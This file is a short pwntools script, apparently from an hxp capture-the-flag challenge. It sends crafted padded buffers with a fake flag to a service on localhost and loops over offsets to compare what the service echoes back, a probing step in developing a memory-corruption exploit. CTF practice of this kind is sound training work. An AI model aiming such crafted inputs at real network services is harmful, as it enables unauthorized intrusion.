#!/usr/bin/env python3
from pwn import *
for off2 in range(34):
    #io = remote('78.47.126.177', 7777)
    io = remote('localhost', 7777)
    try:
        io.recvuntil('First Flag:\n')
        io.sendline(b'\x00' + b'2' * 0xfc)
        io.recvuntil('Second Flag:\n')
        exp2 = b'hxp{' + b'A' * 34
        buf2 = b'B' * off2 + exp2 + b'\x00'
        buf2 += b'C' * (0xfe - len(buf2))
        io.sendline(buf2)
        io.recvuntil('Going to output')
        io.recvline()
        actual = io.recvline().strip()
        if exp2 != actual:
            print(f'>>> {(off2, exp2, actual)}')
    finally:
        io.close()
